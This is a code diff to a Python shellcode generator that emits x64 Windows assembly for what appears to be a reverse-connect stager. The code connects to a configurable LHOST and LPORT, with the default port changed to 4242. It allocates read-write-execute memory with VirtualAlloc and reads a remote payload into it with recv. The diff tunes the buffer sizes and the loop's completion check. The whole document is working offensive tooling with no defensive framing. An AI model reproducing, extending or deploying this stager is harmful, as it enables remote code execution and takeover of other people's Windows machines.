@@ -87,7 +87,6 @@ class Shellcode():
 
         self.stack_space = builder.calc_stack_space(sc_args)
         self.storage_offsets = builder.gen_offsets(sc_args)
-        self.sock_buffer_size = 0x1000 * 1100
 
         return
 
@@ -99,12 +98,17 @@ class Shellcode():
         if (argv_dict == None):
             exit(-1)
 
+        # Configure the options used by the host to obtain the callback
         if ("LPORT" not in argv_dict.keys()):
-            self.lport = 4444
+            self.lport = 4242
         else:
             self.lport = int(argv_dict["LPORT"])
 
         self.lhost = argv_dict['LHOST']
+
+        # Set the initial allocation size and how much to recv per call
+        self.alloc_size = 0x3000
+        self.recv_size = 0x1000
 
         return 0
 
@@ -112,6 +116,7 @@ class Shellcode():
         """Returns assembly source code for the main functionality of the stub
         """
 
+        # Setup the members of the sockaddr structure
         sin_port = struct.pack('<H', self.lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
         sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
@@ -149,7 +154,7 @@ call_connect:
 
 call_VirtualAlloc:
     mov rcx, [rbp - {self.storage_offsets['pResponse']}]
-    mov rdx, {self.sock_buffer_size}
+    mov rdx, {self.alloc_size}
     mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
     mov r9, {winnt.PAGE_EXECUTE_READWRITE}
     mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
@@ -161,14 +166,18 @@ call_VirtualAlloc:
 call_recv:
     mov rcx, [rbp - {self.storage_offsets['sockfd']}]
     mov rdx, [rbp - {self.storage_offsets['pResponse']}]
-    mov r8, 0x5000
+    mov r8, {self.recv_size}
     xor r9, r9
     mov rax, [rbp - {self.storage_offsets['recv']}]
     call rax
 
 check_complete:
-    test eax, eax
-    jle download_complete
+    cmp rax, {self.recv_size}
+    je inc_ptr
+    cmp rax, {self.recv_size}
+    jl download_complete
+;    test eax, eax
+;    jle download_complete
 
 inc_ptr:
     mov r8, [rbp - {self.storage_offsets['pResponse']}]
